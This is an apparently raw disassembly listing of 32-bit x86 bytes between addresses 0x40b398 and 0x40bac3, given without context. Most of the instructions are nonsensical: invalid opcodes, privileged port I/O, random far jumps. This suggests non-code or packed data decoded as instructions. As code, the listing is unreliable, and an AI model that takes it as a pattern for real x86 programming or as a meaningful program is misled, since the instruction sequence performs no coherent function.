  40b398:	adc    dl,BYTE PTR [ebx-0x59fdeff7]
  40b39e:	dec    edi
  40b39f:	push   0x20524b8e
  40b3a4:	xor    ch,0xc5
  40b3a7:	push   ss
  40b3a8:	test   al,ch
  40b3aa:	sub    al,0xd4
  40b3ac:	mov    ds:0xd551c6f,al
  40b3b1:	mov    ebx,0xe34ed5bb
  40b3b6:	inc    ecx
  40b3b7:	or     al,0xfb
  40b3b9:	add    al,0x63
  40b3bb:	adc    DWORD PTR [edi],0x34
  40b3be:	lock jp 0x40b3d4
  40b3c1:	or     bl,ch
  40b3c3:	jl     0x40b436
  40b3c5:	and    eax,0xf29d16c9
  40b3ca:	sbb    DWORD PTR [ecx+0x8],ebp
  40b3cd:	mov    ebx,cs
  40b3cf:	inc    edi
  40b3d0:	dec    eax
  40b3d1:	xchg   ecx,eax
  40b3d2:	sbb    al,cl
  40b3d4:	mov    BYTE PTR [ebp+0x1762ef22],dh
  40b3da:	scas   al,BYTE PTR es:[edi]
  40b3db:	sti    
  40b3dc:	cmp    al,0x4
  40b3de:	xor    eax,0xf6f68c05
  40b3e3:	inc    edi
  40b3e4:	aam    0xa1
  40b3e6:	mov    eax,0x9456a40a
  40b3eb:	adc    BYTE PTR [edx-0x15edd1f9],0x73
  40b3f2:	sbb    BYTE PTR [edx],bl
  40b3f4:	mov    ecx,0x60799816
  40b3f9:	mov    ecx,0xd9e0d424
  40b3fe:	add    bl,BYTE PTR [esi+0xe]
  40b401:	sti    
  40b402:	pusha  
  40b403:	loop   0x40b42f
  40b405:	lock enter 0xc856,0xb
  40b40a:	mov    ebp,cs
  40b40c:	and    al,dh
  40b40e:	sbb    ebx,DWORD PTR [edi+0x107f4ef8]
  40b414:	clc    
  40b415:	mov    cl,0x37
  40b417:	push   ss
  40b418:	sub    eax,0x71319a3e
  40b41d:	stos   DWORD PTR es:[edi],eax
  40b41e:	imul   al
  40b420:	out    dx,al
  40b421:	xchg   esi,eax
  40b422:	clc    
  40b423:	outs   dx,DWORD PTR ds:[esi]
  40b424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b425:	mov    cl,BYTE PTR [ebx]
  40b427:	outs   dx,DWORD PTR ds:[esi]
  40b428:	inc    ebx
  40b429:	jae    0x40b3f3
  40b42b:	mov    ebp,0x412b5682
  40b430:	es cwde 
  40b432:	cmp    BYTE PTR [eax-0x12],ch
  40b435:	ss pop ecx
  40b437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b438:	or     al,0x1b
  40b43a:	mov    dh,0xbc
  40b43c:	sbb    bl,ah
  40b43e:	outs   dx,BYTE PTR ds:[esi]
  40b43f:	sti    
  40b440:	imul   ebp,DWORD PTR [ebx+esi*1],0xffffffa0
  40b444:	arpl   WORD PTR [ebx],bp
  40b446:	test   eax,0xed5ace4c
  40b44c:	jl     0x40b44c
  40b44e:	stos   DWORD PTR es:[edi],eax
  40b44f:	cs push es
  40b451:	mov    ebx,0x7775d6f2
  40b456:	sbb    al,0xd2
  40b458:	outs   dx,BYTE PTR ds:[esi]
  40b459:	inc    esp
  40b45a:	fcom   QWORD PTR [edi+0x62]
  40b45d:	or     esi,esp
  40b45f:	cld    
  40b460:	pop    ebx
  40b461:	fwait
  40b462:	xor    eax,0x51e4e622
  40b467:	neg    BYTE PTR [edi-0x5777401]
  40b46d:	dec    edi
  40b46e:	xor    edx,DWORD PTR [edi+0x6e0b46e0]
  40b474:	iret   
  40b475:	sahf   
  40b476:	jns    0x40b485
  40b478:	cdq    
  40b479:	add    ebx,DWORD PTR [edx-0x3dd056cb]
  40b47f:	mov    dh,0x83
  40b481:	bound  ebx,QWORD PTR [edx+edi*4-0x63]
  40b485:	pop    ss
  40b486:	pop    edx
  40b487:	inc    ecx
  40b488:	imul   ebx,DWORD PTR [edi-0x217b8563],0xffffffd2
  40b48f:	pushf  
  40b490:	pop    esi
  40b491:	int3   
  40b492:	hlt    
  40b493:	jg     0x40b462
  40b495:	pop    ebp
  40b496:	add    edx,ebp
  40b498:	shl    BYTE PTR [ecx+ecx*4],0x1d
  40b49c:	lds    esp,FWORD PTR [edx]
  40b49e:	or     bl,BYTE PTR [edx]
  40b4a0:	clc    
  40b4a1:	xchg   esp,eax
  40b4a2:	(bad)  
  40b4a3:	in     eax,dx
  40b4a4:	inc    ebx
  40b4a5:	cmc    
  40b4a6:	je     0x40b4cc
  40b4a8:	xor    ebx,0xffffffd2
  40b4ab:	or     DWORD PTR [ebx+0x35],0xd2fa4ffd
  40b4b2:	adc    DWORD PTR [ecx-0x24],ecx
  40b4b5:	mov    ecx,0x5526a110
  40b4ba:	jae    0x40b4d9
  40b4bc:	adc    eax,0x4cacb45a
  40b4c1:	aam    0xda
  40b4c3:	lods   al,BYTE PTR ds:[esi]
  40b4c4:	jns    0x40b4f2
  40b4c6:	out    dx,eax
  40b4c7:	mov    ds,eax
  40b4c9:	adc    BYTE PTR [edx+0x7fe502ba],0xe5
  40b4d0:	lea    edi,[edx]
  40b4d2:	pop    ebx
  40b4d3:	into   
  40b4d4:	push   edx
  40b4d5:	inc    ebx
  40b4d6:	and    eax,0x3c9e3e6e
  40b4db:	pushf  
  40b4dc:	mov    BYTE PTR [ebx+eiz*2+0x234e0fe4],bh
  40b4e3:	sbb    esp,esi
  40b4e5:	iret   
  40b4e6:	push   edx
  40b4e7:	pushf  
  40b4e8:	push   es
  40b4e9:	sbb    al,0xa9
  40b4eb:	mul    dl
  40b4ed:	push   0xc17942e
  40b4f2:	cmc    
  40b4f3:	out    dx,eax
  40b4f4:	mov    ch,0xd1
  40b4f6:	xchg   esp,eax
  40b4f7:	fisttp DWORD PTR [edx+0x44]
  40b4fa:	or     eax,ebx
  40b4fc:	or     eax,0x842efeaa
  40b501:	int3   
  40b502:	push   0xffffff98
  40b504:	mov    eax,0xc31f4804
  40b509:	xchg   ebx,eax
  40b50a:	call   esi
  40b50c:	pop    ebx
  40b50d:	and    ecx,DWORD PTR [ecx]
  40b50f:	leave  
  40b510:	scas   al,BYTE PTR es:[edi]
  40b511:	xor    ch,BYTE PTR [esi]
  40b513:	pop    edx
  40b514:	repnz aad 0xec
  40b517:	stc    
  40b518:	data16 loop 0x40b4a0
  40b51b:	icebp  
  40b51c:	jns    0x40b4c5
  40b51e:	rol    BYTE PTR [ecx+ebx*1],0xf7
  40b522:	sbb    DWORD PTR [eax-0x2e],0x397006ef
  40b529:	pop    ds
  40b52a:	ficomp DWORD PTR [edx-0x45]
  40b52d:	pop    ds
  40b52e:	std    
  40b52f:	add    al,0x9b
  40b531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b532:	(bad)  [edi+0x306fb5c5]
  40b538:	(bad)  [edi]
  40b53a:	scas   eax,DWORD PTR es:[edi]
  40b53b:	addr16 enter 0xd676,0x57
  40b540:	push   ss
  40b541:	(bad)  
  40b542:	push   0x887ec66e
  40b547:	icebp  
  40b548:	in     al,dx
  40b549:	inc    DWORD PTR ds:0x4016fd55
  40b54f:	jp     0x40b54e
  40b551:	push   edi
  40b552:	inc    esp
  40b553:	imul   esi,ebp,0xffffff97
  40b556:	add    eax,0xb277b0ea
  40b55b:	lods   eax,DWORD PTR es:[esi]
  40b55d:	mov    cl,0xe0
  40b55f:	jg     0x40b523
  40b561:	dec    ecx
  40b562:	into   
  40b563:	fsub   QWORD PTR [edi+0xe]
  40b566:	pop    es
  40b567:	test   BYTE PTR [edx+ebx*4-0x36914cb9],0x43
  40b56f:	fadd   QWORD PTR [edi+0x12]
  40b572:	pop    ebp
  40b573:	repz lds ecx,FWORD PTR [eax-0x60c3ffb2]
  40b57a:	ret    0xa3c6
  40b57d:	and    bh,BYTE PTR [ebx-0x40]
  40b580:	or     cl,ch
  40b582:	bound  ecx,QWORD PTR [edx-0x1005fdb]
  40b588:	dec    ecx
  40b589:	ins    DWORD PTR es:[edi],dx
  40b58a:	push   esp
  40b58b:	mov    ebp,0xc9ffad54
  40b590:	push   0xffffffda
  40b592:	fsub   QWORD PTR [ecx+eax*1-0x54b9910e]
  40b599:	test   BYTE PTR [eax+0x46],ch
  40b59c:	sbb    eax,0x932bfe08
  40b5a1:	xor    al,0x2b
  40b5a3:	pushf  
  40b5a4:	addr16 mov esp,0x482661be
  40b5aa:	mov    BYTE PTR [esi-0x5ec8bda8],dh
  40b5b0:	dec    ecx
  40b5b1:	cli    
  40b5b2:	pop    ds
  40b5b3:	sbb    eax,0xaa75a048
  40b5b8:	dec    eax
  40b5b9:	adc    DWORD PTR ds:0xbccfe35d,ebx
  40b5bf:	pushf  
  40b5c0:	stc    
  40b5c1:	fisub  DWORD PTR [ecx+0x62]
  40b5c5:	std    
  40b5c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5c7:	sub    al,0xf5
  40b5c9:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40b5cb:	xchg   BYTE PTR [eax],al
  40b5cd:	ins    DWORD PTR es:[edi],dx
  40b5ce:	imul   ah
  40b5d0:	mov    al,0x81
  40b5d2:	neg    eax
  40b5d4:	out    0x55,al
  40b5d6:	std    
  40b5d7:	cld    
  40b5d8:	push   esi
  40b5d9:	(bad)  
  40b5db:	popa   
  40b5dc:	out    dx,al
  40b5dd:	adc    BYTE PTR [edi-0x39b90467],ah
  40b5e3:	cmp    al,0x9
  40b5e5:	mov    al,dh
  40b5e7:	sub    DWORD PTR [edx+0x6e],0x2d
  40b5eb:	daa    
  40b5ec:	mov    ch,0x4c
  40b5ee:	pop    ebx
  40b5ef:	ret    0x5f01
  40b5f2:	mov    bl,bh
  40b5f4:	add    eax,0x61c2b505
  40b5f9:	jle    0x40b60d
  40b5fb:	(bad)  
  40b5fc:	fld    TBYTE PTR [ecx-0x6a8f327b]
  40b602:	into   
  40b603:	adc    eax,0x34857f1e
  40b608:	xchg   ebx,eax
  40b609:	ror    DWORD PTR [ecx-0x62549549],1
  40b60f:	fnop   
  40b611:	and    DWORD PTR [ebx-0x4758daf9],esi
  40b617:	test   al,0x7b
  40b619:	mov    ecx,DWORD PTR ds:0x1206471
  40b61f:	jle    0x40b628
  40b621:	cmp    BYTE PTR [eax],dh
  40b623:	jae    0x40b5c9
  40b625:	mov    ebp,0xc325b3c6
  40b62a:	inc    ebx
  40b62b:	out    0x25,eax
  40b62d:	div    DWORD PTR [edi-0x54]
  40b630:	pop    ebp
  40b631:	mov    ?,WORD PTR [eax-0x39]
  40b634:	int    0xb4
  40b636:	mov    ch,BYTE PTR [edi-0xa]
  40b639:	ror    DWORD PTR [esp+ecx*4-0x16c41e4a],cl
  40b640:	sahf   
  40b641:	inc    eax
  40b642:	lds    esp,FWORD PTR [ebp-0x47e71a6d]
  40b648:	mov    esi,0xb0974b34
  40b64d:	sahf   
  40b64e:	out    0xd6,eax
  40b650:	mov    cl,0x63
  40b652:	pop    es
  40b653:	lods   al,BYTE PTR ds:[esi]
  40b654:	add    DWORD PTR [esi-0x41d80adf],eax
  40b65a:	sbb    al,0x8a
  40b65c:	lahf   
  40b65d:	sar    eax,cl
  40b65f:	xlat   BYTE PTR ds:[ebx]
  40b660:	je     0x40b67f
  40b662:	mov    cl,0xd3
  40b664:	scas   al,BYTE PTR es:[edi]
  40b665:	fmul   QWORD PTR [eax+edi*4+0x23]
  40b669:	xor    eax,edx
  40b66b:	out    dx,al
  40b66c:	dec    edi
  40b66d:	xor    eax,0x5324b7b5
  40b672:	outs   dx,DWORD PTR ds:[esi]
  40b673:	lds    ecx,FWORD PTR [ebx+ebx*4]
  40b676:	dec    esp
  40b677:	imul   ecx,DWORD PTR [eax+0x7014e02],0x58
  40b67e:	stos   DWORD PTR es:[edi],eax
  40b67f:	fxch   st(2)
  40b681:	xor    BYTE PTR [eax+0x55],bl
  40b684:	push   0x2080a15
  40b689:	pop    eax
  40b68a:	shr    DWORD PTR [ebp-0x6c],1
  40b68d:	cmp    ecx,ebp
  40b68f:	sbb    esi,esp
  40b691:	mov    dh,0x70
  40b693:	and    edi,edx
  40b695:	push   esp
  40b696:	jns    0x40b6c9
  40b698:	cmp    al,0x62
  40b69a:	or     dh,al
  40b69c:	(bad)  
  40b69d:	sub    al,0xf4
  40b69f:	push   edi
  40b6a0:	inc    esp
  40b6a1:	das    
  40b6a2:	mov    ch,0x93
  40b6a4:	out    0xd6,eax
  40b6a6:	or     al,0x6f
  40b6a8:	mov    edx,0x38ce83f7
  40b6ad:	mov    ebp,0xb0b62e35
  40b6b2:	or     ecx,edx
  40b6b4:	int    0xff
  40b6b6:	jge    0x40b67d
  40b6b8:	mov    dh,0x17
  40b6ba:	stos   DWORD PTR es:[edi],eax
  40b6bb:	pop    esp
  40b6bc:	sub    cl,0x29
  40b6bf:	mov    BYTE PTR [eax-0x7b],cl
  40b6c2:	xchg   ebx,eax
  40b6c3:	jno    0x40b656
  40b6c5:	inc    ecx
  40b6c6:	or     BYTE PTR [ebp+ebp*2-0x487f85e7],dl
  40b6cd:	scas   eax,DWORD PTR es:[edi]
  40b6ce:	aaa    
  40b6cf:	cmp    bh,BYTE PTR [ecx]
  40b6d1:	out    dx,eax
  40b6d2:	sbb    DWORD PTR [eax],ebp
  40b6d4:	iret   
  40b6d5:	jae    0x40b6fa
  40b6d7:	sbb    al,BYTE PTR [esi+ebp*1+0x4812813c]
  40b6de:	lods   al,BYTE PTR ds:[esi]
  40b6df:	std    
  40b6e0:	mov    ecx,ecx
  40b6e2:	push   cs
  40b6e3:	inc    ecx
  40b6e4:	mov    dl,0x7
  40b6e6:	out    0x15,eax
  40b6e8:	push   es
  40b6e9:	int    0x69
  40b6eb:	(bad)  
  40b6ec:	fdivp  st(2),st
  40b6ee:	stos   DWORD PTR es:[edi],eax
  40b6ef:	mov    BYTE PTR [edi],bh
  40b6f1:	inc    ebp
  40b6f2:	jg     0x40b773
  40b6f4:	push   0x7512f836
  40b6f9:	(bad)  
  40b6fa:	inc    ebx
  40b6fb:	jbe    0x40b6a1
  40b6fd:	fld    DWORD PTR [edx]
  40b6ff:	cmp    al,0x12
  40b701:	inc    esi
  40b702:	pop    esi
  40b703:	rcr    ebp,cl
  40b705:	(bad)  [eax]
  40b707:	xor    bh,cl
  40b709:	outs   dx,BYTE PTR ds:[esi]
  40b70a:	shl    BYTE PTR [ebp+0x46945570],cl
  40b710:	pop    edi
  40b711:	ins    BYTE PTR es:[edi],dx
  40b712:	and    ch,bh
  40b714:	inc    esp
  40b715:	ror    edi,1
  40b717:	push   esi
  40b718:	adc    eax,0x9e0962a8
  40b71d:	test   al,0x9a
  40b71f:	in     al,0xeb
  40b721:	ins    BYTE PTR es:[edi],dx
  40b722:	xor    BYTE PTR [ecx-0x45],dl
  40b725:	icebp  
  40b726:	xchg   DWORD PTR [ecx],edx
  40b728:	adc    al,0x11
  40b72a:	mov    BYTE PTR [esi],dl
  40b72c:	ds pop ecx
  40b72e:	xchg   ebx,eax
  40b72f:	jmp    FWORD PTR [ecx-0x537c5158]
  40b735:	sub    al,0x66
  40b737:	aad    0xe7
  40b739:	fsubr  DWORD PTR [eax-0x71]
  40b73c:	fs push esi
  40b73e:	and    ebp,edx
  40b740:	cmp    eax,0x1b1442ff
  40b745:	jmp    0x27fc:0xe4cd6636
  40b74c:	ins    DWORD PTR es:[edi],dx
  40b74d:	or     al,0x25
  40b74f:	clc    
  40b750:	sub    al,0xcb
  40b752:	(bad)  
  40b753:	fst    QWORD PTR [edx-0x6d5113c9]
  40b759:	in     eax,0x6a
  40b75b:	jecxz  0x40b7aa
  40b75d:	leave  
  40b75e:	sbb    eax,0xa2e836e8
  40b763:	(bad)  
  40b764:	clc    
  40b765:	sbb    DWORD PTR [ecx],ecx
  40b767:	inc    esi
  40b768:	adc    eax,esi
  40b76a:	xchg   edi,eax
  40b76b:	sub    edi,ebp
  40b76d:	mov    dl,0x1f
  40b76f:	rol    BYTE PTR [edi],0x7d
  40b772:	in     al,dx
  40b773:	outs   dx,DWORD PTR ds:[esi]
  40b774:	and    al,0xea
  40b776:	(bad)  
  40b777:	jae    0x40b7f3
  40b779:	cld    
  40b77a:	mov    bh,0x2f
  40b77c:	mov    esi,0x9fe3447
  40b781:	and    cl,BYTE PTR [ebp+edx*2+0x68]
  40b785:	imul   esi,edx,0xffffff8a
  40b788:	mov    eax,fs
  40b78a:	push   ebp
  40b78b:	int3   
  40b78c:	or     DWORD PTR [ecx],edx
  40b78e:	and    BYTE PTR [ecx-0x52c69c77],ch
  40b794:	into   
  40b795:	stc    
  40b796:	adc    eax,0xd04dd435
  40b79b:	dec    edx
  40b79c:	pop    edx
  40b79d:	in     al,0x27
  40b79f:	inc    edx
  40b7a0:	and    DWORD PTR [ecx+0x2],0x5a
  40b7a4:	imul   ecx,ebp,0xfc3a9df8
  40b7aa:	aam    0x3c
  40b7ac:	das    
  40b7ad:	cmp    esp,DWORD PTR [edi]
  40b7af:	sub    BYTE PTR [eax+0x20],ah
  40b7b2:	loopne 0x40b7ee
  40b7b4:	xchg   esp,eax
  40b7b5:	jbe    0x40b763
  40b7b7:	inc    ebx
  40b7b8:	pop    ss
  40b7b9:	mov    eax,ds:0xab67b7d6
  40b7be:	ins    BYTE PTR es:[edi],dx
  40b7bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7c0:	sub    eax,0xe7068b4a
  40b7c5:	mov    bh,0x86
  40b7c7:	xor    al,0xa0
  40b7c9:	shl    DWORD PTR [edi],0x7d
  40b7cc:	adc    cl,BYTE PTR [eax+0x6]
  40b7cf:	out    0x77,al
  40b7d1:	cmp    ch,cl
  40b7d3:	push   0xc7b09114
  40b7d8:	pop    esi
  40b7d9:	loop   0x40b764
  40b7db:	mov    esi,0x44bf702c
  40b7e0:	sub    eax,DWORD PTR [ebp+0x76]
  40b7e3:	hlt    
  40b7e4:	or     eax,0x6281e28a
  40b7e9:	fisttp WORD PTR [ebx-0x412ef639]
  40b7ef:	mov    al,0x54
  40b7f1:	mov    BYTE PTR gs:[edx-0x59ab4f74],al
  40b7f8:	inc    edi
  40b7f9:	mov    al,ds:0xa68aa0b4
  40b7fe:	xor    bh,ah
  40b800:	fwait
  40b801:	push   eax
  40b802:	clc    
  40b803:	sub    eax,esp
  40b805:	or     DWORD PTR [edi+edx*1],0xffffffe4
  40b809:	add    ch,al
  40b80b:	das    
  40b80c:	mov    bh,0x31
  40b80e:	(bad)  
  40b80f:	(bad)  
  40b810:	xor    eax,0x5963a988
  40b815:	outs   dx,DWORD PTR ds:[esi]
  40b816:	add    bl,dl
  40b818:	cmp    eax,0xa40575cd
  40b81d:	mov    edi,0x8695319b
  40b822:	(bad)  
  40b823:	ret    0xf432
  40b826:	or     al,0x4e
  40b828:	call   0xf939:0xafb1b821
  40b82f:	or     al,BYTE PTR es:[edx-0x79]
  40b833:	in     al,0xd
  40b835:	ss pop ds
  40b837:	aas    
  40b838:	bound  eax,QWORD PTR [edx]
  40b83a:	inc    ebp
  40b83b:	adc    al,0x54
  40b83d:	(bad)  
  40b840:	mov    ch,0x1f
  40b842:	pop    ds
  40b843:	scas   eax,DWORD PTR es:[edi]
  40b844:	jge    0x40b837
  40b846:	push   cs
  40b847:	aas    
  40b848:	test   DWORD PTR [edx-0x4478206e],ebp
  40b84e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b84f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b850:	(bad)  
  40b851:	cmp    al,0x69
  40b853:	nop
  40b854:	xor    al,0xe9
  40b856:	xor    edi,ecx
  40b858:	popf   
  40b859:	sub    DWORD PTR [esi+0x645bddd5],eax
  40b85f:	nop
  40b860:	ds test eax,0xdb0755d3
  40b866:	mov    eax,0xf6604bf2
  40b86b:	test   al,0x85
  40b86d:	xchg   esp,eax
  40b86e:	add    BYTE PTR [esi],bh
  40b870:	cmp    bl,cl
  40b872:	jno    0x40b84e
  40b874:	cmc    
  40b875:	mov    BYTE PTR [edi+0x5f],bl
  40b878:	je     0x40b811
  40b87a:	adc    ebx,edi
  40b87c:	repnz add esp,ecx
  40b87f:	jmp    0x40b86b
  40b881:	(bad)  
  40b882:	mov    ecx,0x61467c77
  40b887:	retf   
  40b888:	ss push ecx
  40b88a:	inc    ebp
  40b88b:	test   eax,0x682e28da
  40b890:	call   0x15c4b23e
  40b895:	sbb    ah,dl
  40b897:	ins    BYTE PTR es:[edi],dx
  40b898:	neg    ebx
  40b89a:	xor    eax,DWORD PTR [ebx+ebx*8+0x20]
  40b89e:	bound  edi,QWORD PTR [edx+ebp*8]
  40b8a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8a2:	sub    cl,BYTE PTR [esi+0x2c8ca8ad]
  40b8a8:	fstp   QWORD PTR [ebp+0x3b]
  40b8ab:	sti    
  40b8ac:	int    0x2e
  40b8ae:	inc    esp
  40b8af:	add    BYTE PTR [ecx+0x7faf4fa2],0xb3
  40b8b6:	pop    esp
  40b8b7:	stc    
  40b8b8:	or     DWORD PTR fs:[esi+0x21035680],0xfffffff2
  40b8c0:	stc    
  40b8c1:	sbb    edi,DWORD PTR [edi]
  40b8c3:	sbb    eax,0xb587f858
  40b8c8:	(bad)  
  40b8c9:	ss inc ebp
  40b8cb:	hlt    
  40b8cc:	scas   eax,DWORD PTR es:[edi]
  40b8cd:	repnz loopne 0x40b866
  40b8d0:	call   0xc59af8ab
  40b8d5:	adc    bh,cl
  40b8d7:	ins    BYTE PTR es:[edi],dx
  40b8d8:	mov    ebp,0xa71f083d
  40b8dd:	pop    es
  40b8de:	and    ebx,esi
  40b8e0:	(bad)  
  40b8e1:	pop    eax
  40b8e2:	dec    ebp
  40b8e3:	lods   eax,DWORD PTR ds:[esi]
  40b8e4:	(bad)  
  40b8e5:	sub    eax,0x98e48383
  40b8ea:	xor    DWORD PTR [esp+esi*2-0x65],esi
  40b8ee:	jmp    0x40b8d4
  40b8f0:	push   esi
  40b8f1:	mov    ecx,0x2fe3f18c
  40b8f6:	inc    ecx
  40b8f7:	sbb    BYTE PTR [eiz*8-0x4ae92434],ah
  40b8fe:	xchg   esi,eax
  40b8ff:	mov    ah,0xc
  40b901:	ror    DWORD PTR [ebx],1
  40b903:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b904:	es addr16 inc ecx
  40b907:	ss inc ebx
  40b909:	dec    ebp
  40b90a:	out    dx,eax
  40b90b:	mov    al,ds:0x7c66f519
  40b910:	jmp    0x38b9:0xcfbe4b3d
  40b917:	mov    edi,0xf9c92c54
  40b91c:	xor    DWORD PTR [ebp-0x37],0x34680a1
  40b923:	mov    al,BYTE PTR [edi+0x32]
  40b926:	inc    eax
  40b927:	jg     0x40b98f
  40b929:	jl     0x40b986
  40b92b:	sar    BYTE PTR [eax],cl
  40b92d:	dec    ebp
  40b92e:	cmp    dl,BYTE PTR [edx-0x7c1df99f]
  40b934:	retf   
  40b935:	out    dx,al
  40b936:	fcmovnu st,st(7)
  40b938:	fistp  QWORD PTR [eax]
  40b93a:	leave  
  40b93b:	enter  0x7c5b,0xae
  40b93f:	xor    al,0xf7
  40b941:	add    al,0x6a
  40b943:	sub    al,0x61
  40b945:	popf   
  40b946:	repnz mov ah,0x1b
  40b949:	test   eax,0x4dcb946a
  40b94e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b94f:	adc    dh,dl
  40b951:	cmovnp ebx,DWORD PTR [eax+0x40]
  40b955:	aam    0x16
  40b957:	sub    DWORD PTR [edi+0x7e],0x21
  40b95b:	ret    
  40b95c:	pop    ebp
  40b95d:	dec    esi
  40b95e:	mov    cl,0x3e
  40b960:	fmul   st(4),st
  40b962:	push   esi
  40b963:	xchg   ebx,eax
  40b964:	and    esi,DWORD PTR [edx+edi*2-0x3d]
  40b968:	loopne 0x40b962
  40b96a:	ret    
  40b96b:	dec    ebp
  40b96c:	sahf   
  40b96d:	scas   eax,DWORD PTR es:[edi]
  40b96e:	fwait
  40b96f:	je     0x40b9cc
  40b971:	out    0xd7,eax
  40b973:	loopne 0x40b944
  40b975:	retf   0x53e6
  40b978:	dec    esp
  40b979:	stc    
  40b97a:	cmp    BYTE PTR [ecx-0x2fd8744b],dh
  40b980:	mov    bh,0x7e
  40b982:	iret   
  40b983:	xchg   ebp,eax
  40b984:	ss std 
  40b986:	inc    ebx
  40b987:	mov    DWORD PTR [ebx-0x45d5f947],eax
  40b98d:	inc    esp
  40b98e:	dec    ebx
  40b98f:	in     al,0x69
  40b991:	shl    DWORD PTR [esi],0x5e
  40b994:	shr    BYTE PTR [edi+edi*1],0xa
  40b998:	inc    edx
  40b999:	adc    al,0x9c
  40b99b:	jne    0x40b970
  40b99d:	int3   
  40b99e:	aam    0xb3
  40b9a0:	(bad)  
  40b9a1:	popf   
  40b9a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9a3:	in     al,dx
  40b9a4:	out    dx,al
  40b9a5:	clc    
  40b9a6:	xchg   ecx,eax
  40b9a7:	mov    bh,BYTE PTR [edi]
  40b9a9:	clc    
  40b9aa:	mov    bh,0xb6
  40b9ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9ad:	mov    ebx,0xded6ca6
  40b9b2:	and    bl,bl
  40b9b4:	loope  0x40b97d
  40b9b6:	xor    DWORD PTR [ebx-0x4f7669b],ecx
  40b9bc:	adc    DWORD PTR [ebx-0x4915874a],esp
  40b9c2:	std    
  40b9c3:	in     eax,0xad
  40b9c5:	inc    edx
  40b9c6:	fldenv [esi+eiz*4]
  40b9c9:	inc    esi
  40b9ca:	lods   al,BYTE PTR ds:[esi]
  40b9cb:	push   esp
  40b9cc:	pop    esp
  40b9cd:	xor    esp,DWORD PTR [edi]
  40b9cf:	or     eax,0xc1eadc78
  40b9d4:	adc    al,0x21
  40b9d6:	dec    ebx
  40b9d7:	pop    edx
  40b9d8:	aad    0xd7
  40b9da:	or     esp,DWORD PTR [esi]
  40b9dc:	dec    edi
  40b9dd:	test   BYTE PTR [ecx],al
  40b9df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9e0:	hlt    
  40b9e1:	pop    eax
  40b9e2:	arpl   bx,di
  40b9e4:	outs   dx,DWORD PTR ds:[esi]
  40b9e5:	call   0x3bfe9a4b
  40b9ea:	neg    DWORD PTR [eax-0x3fdbfa49]
  40b9f0:	out    dx,al
  40b9f1:	jno    0x40b9d5
  40b9f3:	adc    al,BYTE PTR [edi+0x2ddc5ec4]
  40b9f9:	dec    edi
  40b9fa:	pushf  
  40b9fb:	pop    ebx
  40b9fc:	shl    BYTE PTR [ecx+ebx*2-0x2fa0f507],0xfc
  40ba04:	adc    ch,bl
  40ba06:	in     eax,0xe6
  40ba08:	push   ebp
  40ba09:	(bad)  
  40ba0a:	xor    ebp,DWORD PTR [edi]
  40ba0c:	jle    0x40b9d6
  40ba0e:	loop   0x40b9e3
  40ba10:	jno    0x40ba43
  40ba12:	stos   BYTE PTR es:[edi],al
  40ba13:	aas    
  40ba14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba15:	sahf   
  40ba16:	sbb    al,0xd6
  40ba18:	repnz call 0x204d:0x72bc110a
  40ba20:	lahf   
  40ba21:	or     DWORD PTR [esi+0x24114c8],ecx
  40ba27:	sub    dh,BYTE PTR [edi]
  40ba29:	fidivr WORD PTR [esi-0x17]
  40ba2c:	mov    edx,DWORD PTR [eax]
  40ba2e:	push   cs
  40ba2f:	lsl    edi,WORD PTR [esi]
  40ba32:	jb     0x40bab0
  40ba34:	hlt    
  40ba35:	ficom  DWORD PTR [edx]
  40ba37:	sub    ebp,DWORD PTR [ebx]
  40ba39:	push   ebx
  40ba3a:	retf   
  40ba3b:	pop    esp
  40ba3c:	ds imul ecx,esi,0xe4af0a9f
  40ba43:	sar    BYTE PTR [ebx],cl
  40ba45:	imul   esp,DWORD PTR [edi],0xffffff9a
  40ba48:	shl    DWORD PTR [eax+0x23e4a15],cl
  40ba4e:	fidiv  WORD PTR [esi-0x1c096547]
  40ba54:	push   ds
  40ba55:	pushf  
  40ba56:	add    al,0x37
  40ba58:	cmp    DWORD PTR es:[eax-0x482051b5],esi
  40ba5f:	bound  edx,QWORD PTR [edx]
  40ba61:	mov    cl,BYTE PTR [ebx+0x6a43612c]
  40ba67:	cmp    DWORD PTR [ebp-0x587f2ff0],edi
  40ba6d:	test   eax,0x9cd7de28
  40ba72:	test   edi,0xa337dc6
  40ba78:	or     dh,BYTE PTR [edx+0x29]
  40ba7b:	fisubr DWORD PTR [ebx+0x3e1b18c5]
  40ba81:	xchg   edi,eax
  40ba82:	lods   al,BYTE PTR ds:[esi]
  40ba83:	aaa    
  40ba84:	outs   dx,BYTE PTR ds:[esi]
  40ba85:	push   ebx
  40ba86:	ret    
  40ba87:	jae    0x40ba41
  40ba89:	jne    0x40ba0b
  40ba8b:	push   es
  40ba8c:	inc    edi
  40ba8d:	enter  0xc252,0x95
  40ba91:	dec    ebp
  40ba92:	fs mov dh,0x82
  40ba95:	jp     0x40ba75
  40ba97:	jle    0x40ba69
  40ba99:	adc    DWORD PTR [edi],0xad495a5f
  40ba9f:	sbb    cl,bh
  40baa1:	(bad)  
  40baa2:	xor    BYTE PTR [ebx+0x9],cl
  40baa5:	fld    DWORD PTR [edi]
  40baa7:	mov    ch,0x1f
  40baa9:	ds xor al,0x76
  40baac:	ja     0x40ba40
  40baae:	shl    DWORD PTR [esi+0x18f9381c],1
  40bab4:	leave  
  40bab5:	retf   
  40bab6:	mov    ds:0x2d7cb004,eax
  40babb:	inc    esi
  40babc:	fbstp  TBYTE PTR [ecx]
  40babe:	repz xchg edx,eax
  40bac0:	ret    
  40bac1:	pop    ebx
  40bac2:	(bad)  
  40bac3:	loope  0x40bacf
